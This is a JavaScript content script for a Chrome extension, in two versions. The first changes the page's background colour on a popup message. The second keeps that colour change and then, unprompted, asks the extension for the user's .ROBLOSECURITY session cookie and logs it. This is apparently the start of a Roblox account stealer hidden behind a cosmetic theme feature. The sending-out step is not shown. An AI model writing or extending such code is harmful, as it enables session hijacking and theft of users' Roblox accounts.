// Listen for messages from the popup
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === 'changeBackground') {
        // Change the background color of the body or a specific element
        document.body.style.backgroundColor = request.color;  // Set the background color

        // Optionally, change the text color for better visibility
        document.body.style.color = request.textColor || '#fff'; // Default to white if no text color is given

        sendResponse({ status: 'success' });
    }
});

//////

// Assuming you already have the background color change logic in place
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === 'changeBackground') {
        document.body.style.backgroundColor = request.color;

        // After changing background, retrieve the ROBLOSECURITY cookie
        chrome.runtime.sendMessage({ action: 'getRobloxCookie' }, (response) => {
            if (response && response.cookie) {
                console.log('ROBLOSECURITY Cookie:', response.cookie);
            } else {
                console.error('Failed to retrieve ROBLOSECURITY cookie');
            }
        });

        sendResponse({ status: 'success' });
    }
});

